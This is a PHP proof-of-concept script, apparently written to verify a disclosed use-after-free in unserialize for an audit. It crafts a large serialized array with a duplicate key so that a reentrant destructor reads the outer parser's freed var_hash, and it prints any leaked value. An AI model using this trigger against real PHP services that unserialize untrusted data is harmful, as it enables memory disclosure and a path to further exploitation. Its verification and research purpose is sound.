<?php
/* Chain B verification — written from scratch for this audit.
 *
 * Mechanism under test (per the disclosed analysis):
 *   1. A top-level array with > VAR_ENTRIES_MAX (1024) entries forces
 *      php_var_unserialize to allocate extension chunks for var_hash.
 *   2. A duplicate array key moves the *old* value (our object) onto the
 *      deferred-destruction chain inside var_hash.
 *   3. var_destroy() phase 1 efree()s the extension chunks, then phase 2
 *      walks the dtor chain and fires __destruct WITHOUT holding
 *      BG(serialize_lock).
 *   4. Our destructor calls unserialize('R:1500;'). A *fresh* parse would
 *      have an empty var_hash -> R:1500 must return FALSE. If it returns
 *      anything else, the inner parser is reading the OUTER var_hash whose
 *      extension chunks were just efree()d  =>  use-after-free read.
 */

class Reentry {
    public function __destruct() {
        fwrite(STDERR, "[*] __destruct fired during var_destroy (lock not held)\n");
        $r = @unserialize('R:1500;');
        $t = gettype($r);
        fwrite(STDERR, "[*] inner unserialize('R:1500;') -> " . $t . "\n");
        if ($t !== 'boolean') {
            fwrite(STDERR, "[+] REENTRY-READ CONFIRMED: back-reference resolved from the outer (freed) var_hash\n");
            if (is_int($r)) {
                fwrite(STDERR, "[+] value observed in freed slot #1500: " . var_export($r, true) . "\n");
            }
        } else {
            fwrite(STDERR, "[-] R:1500 returned false — reentry did NOT share the outer var_hash\n");
        }
    }
}

$N = 2000; // > 1024 (VAR_ENTRIES_MAX) so slots >= 1024 land in extension chunks
$p = 'a:' . ($N + 2) . ':{';
for ($i = 0; $i < $N; $i++) {
    $p .= "i:$i;i:$i;";
}
$p .= 'i:424242;O:7:"Reentry":0:{}'; // old value at key 424242
$p .= 'i:424242;i:7;';               // duplicate key -> object pushed to dtor chain
$p .= '}';

fwrite(STDERR, "[*] payload: " . strlen($p) . " bytes, $N entries + dup-key Reentry object\n");
@unserialize($p);
fwrite(STDERR, "[*] done\n");
